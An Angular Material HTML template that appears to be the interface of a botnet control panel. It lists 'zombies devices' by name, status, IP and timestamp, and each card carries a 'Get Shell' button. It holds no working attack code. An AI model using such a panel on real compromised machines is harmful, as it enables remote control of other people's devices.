<mat-card-header>
    <mat-card-title>DEVICES LIST</mat-card-title>
    <mat-card-subtitle>List of zombies devices</mat-card-subtitle>    
</mat-card-header>
  
<mat-card-content>
    <!--<button mat-raised-button color="primary" (click)="updateDevices()">Update Devices info</button>-->

    <mat-grid-list cols="3" rowHeight="2:1">

        <li *ngFor="let data of array_last_devices_info" class="quita-puntos">
        
            <mat-grid-tile>
                <mat-card>

                    <mat-card-header>
                        <div mat-card-avatar class="avatar"></div>
                        <mat-card-title>{{data.name}}</mat-card-title>
                    </mat-card-header>                


                    <mat-card-content>
                        &nbsp;
                        <p>Status: {{data.status}}</p>
                        <p>IP: {{data.ip}}</p>
                        <p>TimeStamp: {{data.time}}</p>

                        <button mat-raised-button color="primary">Get Shell</button>
                    </mat-card-content>
                    
                </mat-card>
            </mat-grid-tile>
        
        </li>
        
    </mat-grid-list>
</mat-card-content>
